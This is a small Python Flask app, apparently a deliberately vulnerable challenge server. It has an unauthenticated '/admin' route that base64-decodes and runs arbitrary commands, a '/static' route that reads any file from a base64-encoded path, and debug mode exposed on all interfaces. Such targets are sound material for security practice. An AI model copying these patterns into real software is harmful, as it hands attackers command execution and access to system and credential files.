from re import sub
from flask import Flask
import base64
import subprocess

app = Flask(__name__)

@app.route("/")
def home():
    return '''<p>Welcome!</p><img src="/static/bG9nby5wbmc=">'''

@app.route("/admin/<b64cmd>")
def admin(b64cmd):
    cmd = base64.b64decode(b64cmd).decode()
    return subprocess.run(cmd.split(' '), capture_output=True).stdout

@app.route("/static/<b64path>")
def get_static(b64path):
    app.logger.info(b64path)
    fpath = base64.b64decode(b64path).decode()
    app.logger.info(fpath)
    with open(fpath, "rb") as f:
        return f.read()

app.run(host="0.0.0.0", debug=True)
